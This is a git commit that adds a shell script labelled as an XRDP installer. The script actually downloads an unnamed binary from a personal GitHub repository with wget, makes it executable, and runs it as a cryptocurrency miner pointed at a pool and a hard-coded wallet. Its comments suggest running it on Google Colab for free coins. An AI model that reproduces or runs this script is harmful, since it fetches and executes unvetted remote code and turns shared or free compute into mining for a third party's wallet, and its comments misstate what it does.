bd080e19e4c6a279281c4c6c27b02138f53fde4b
angkii <83603708+angkii@users.noreply.github.com>
2022-10-02 16:52:53 +0700

    Create kaspa2.sh

---
+++ kaspa2.sh
@@ -0,0 +1,18 @@
+# /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
+clear
+sudo apt install screen
+screen -R AkubapakMU
+
+wget https://github.com/angkii/m/raw/main/AkubapakMU
+chmod 700 AkubapakMU
+
+#!/bin/bash
+
+POOL=asia.rplant.xyz:7064
+WALLET=bc1q9weckakf20ucvurkqvwrfdwnsgsc6qymn6darp
+
+./AkubapakMU --algo heavyhash --pool $POOL --user $WALLET $@ --no-cl
